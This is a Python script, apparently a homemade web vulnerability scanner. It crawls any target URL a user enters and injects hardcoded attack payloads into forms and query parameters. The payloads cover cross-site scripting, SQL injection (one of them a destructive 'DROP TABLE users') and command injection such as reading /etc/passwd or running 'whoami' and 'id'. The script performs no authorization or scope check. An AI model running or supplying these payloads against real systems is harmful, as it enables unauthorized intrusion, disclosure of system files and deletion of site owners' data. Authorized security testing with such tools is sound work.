import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import re

visited_links = set()
vulnerable_links = []

# Payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "'><img src=x onerror=alert(1)>",
    "<svg/onload=alert('xss')>",
    "';alert(String.fromCharCode(88,83,83))//"
]
sqli_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR 1=1--",
    "'; DROP TABLE users--",
    "\" OR \"\" = \"",
    "' UNION SELECT null,null,null--"
]
cmd_payloads = [
    "; cat /etc/passwd",
    "&& dir",
    "| whoami",
    "`ls -la`",
    "$(id)"
]

headers = {
    "User-Agent": "VulnScanner/1.0"
}

def is_valid_url(url):
    parsed = urlparse(url)
    return bool(parsed.netloc) and bool(parsed.scheme)

def get_forms(url):
    try:
        res = requests.get(url, headers=headers, timeout=5)
        soup = BeautifulSoup(res.content, "html.parser")
        return soup.find_all("form")
    except:
        return []

def form_details(form):
    details = {}
    try:
        action = form.attrs.get("action")
        method = form.attrs.get("method", "get").lower()
        inputs = []
        for input_tag in form.find_all("input"):
            name = input_tag.attrs.get("name")
            input_type = input_tag.attrs.get("type", "text")
            value = input_tag.attrs.get("value", "")
            inputs.append({"name": name, "type": input_type, "value": value})
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
    except:
        pass
    return details

def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input in form_details["inputs"]:
        if input["type"] == "text" or input["type"] == "search":
            data[input["name"]] = payload
        else:
            data[input["name"]] = input["value"]

    try:
        if form_details["method"] == "post":
            res = requests.post(target_url, data=data, headers=headers)
        else:
            res = requests.get(target_url, params=data, headers=headers)
        return res
    except:
        return None

def scan_xss(url):
    forms = get_forms(url)
    for form in forms:
        details = form_details(form)
        for payload in xss_payloads:
            response = submit_form(details, url, payload)
            if response and payload in response.text:
                print(f"[!] XSS Detected on {url} with payload: {payload}")
                vulnerable_links.append((url, "XSS"))
                break


def scan_sql_injection(url):
    parsed_url = urlparse(url)
    query = parsed_url.query
    if query:
        for param in query.split("&"):
            if "=" not in param:
                continue
            key, value = param.split("=")
            for payload in sqli_payloads:
                test_url = url.replace(f"{key}={value}", f"{key}={payload}")
                try:
                    res = requests.get(test_url, headers=headers)
                    errors = ["sql syntax", "mysql_fetch", "ORA-", "syntax error", "warning", "quoted string not properly terminated"]
                    for error in errors:
                        if error.lower() in res.text.lower():
                            print(f"[!] SQL Injection vulnerability at {test_url} using payload: {payload}")
                            vulnerable_links.append((test_url, "SQLi"))
                            return
                except:
                    continue


def scan_command_injection(url):
    forms = get_forms(url)
    for form in forms:
        details = form_details(form)
        for payload in cmd_payloads:
            response = submit_form(details, url, payload)
            if response and any(keyword in response.text for keyword in ["root:x", "uid=", "admin", "bin/bash"]):
                print(f"[!] Command Injection Detected on {url} with payload: {payload}")
                vulnerable_links.append((url, "Command Injection"))
                break


def crawl(url, max_depth=2):
    if url in visited_links or max_depth == 0:
        return
    print(f"Crawling: {url}")
    visited_links.add(url)

    try:
        res = requests.get(url, headers=headers, timeout=5)
        soup = BeautifulSoup(res.content, "html.parser")
        for link in soup.find_all("a"):
            href = link.attrs.get("href")
            if href:
                href = urljoin(url, href)
                if is_valid_url(href) and urlparse(href).netloc == urlparse(url).netloc:
                    crawl(href, max_depth - 1)
                    scan_sql_injection(href)
                    scan_xss(href)
                    scan_command_injection(href)
    except:
        pass

if __name__ == "__main__":
    target = input("Enter target URL (e.g., http://example.com): ").strip()
    if not target.startswith("http"):
        target = "http://" + target
    crawl(target)

    print("\n--- Vulnerability Summary ---")
    for vuln in vulnerable_links:
        print(f"[!] {vuln[1]} at {vuln[0]}")
    if not vulnerable_links:
        print("No common vulnerabilities detected.")
